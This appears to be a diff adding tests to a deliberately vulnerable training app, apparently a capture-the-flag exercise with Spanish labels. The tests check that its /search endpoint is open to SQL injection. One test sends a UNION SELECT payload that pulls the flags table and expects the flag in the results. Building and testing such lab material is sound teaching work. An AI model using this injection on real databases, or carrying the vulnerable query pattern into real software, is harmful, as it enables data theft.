@@ -52,3 +52,31 @@ describe('VULN 1 — SQL Injection en login', () => {
     assert.ok(res.body.debug, 'Debe incluir la query ejecutada');
   });
 });
+
+describe('VULN 1b — SQL Injection en /search (UNION SELECT)', () => {
+  let cookie;
+  before(async () => {
+    const res = await request(app).post('/login').send({ username: 'alumno_lopez', password: 'alumno123' });
+    cookie = res.headers['set-cookie'];
+  });
+
+  test('Búsqueda normal retorna usuarios', async () => {
+    const res = await request(app).get('/search?q=Lopez').set('Cookie', cookie);
+    assert.equal(res.status, 200);
+    assert.ok(Array.isArray(res.body.results));
+    assert.ok(res.body.results.length > 0);
+  });
+
+  test('UNION SELECT extrae tabla flags y muestra FLAG{sql_1nj3ct10n}', async () => {
+    const payload = encodeURIComponent("' UNION SELECT id, flag, flag, flag, flag FROM flags --");
+    const res = await request(app).get(`/search?q=${payload}`).set('Cookie', cookie);
+    assert.equal(res.status, 200);
+    const valores = res.body.results.flatMap(r => Object.values(r));
+    assert.ok(valores.some(v => String(v).includes('FLAG{')), 'La flag debe aparecer en los resultados');
+  });
+
+  test('/search sin sesión retorna 401', async () => {
+    const res = await request(app).get('/search?q=test');
+    assert.equal(res.status, 401);
+  });
+});
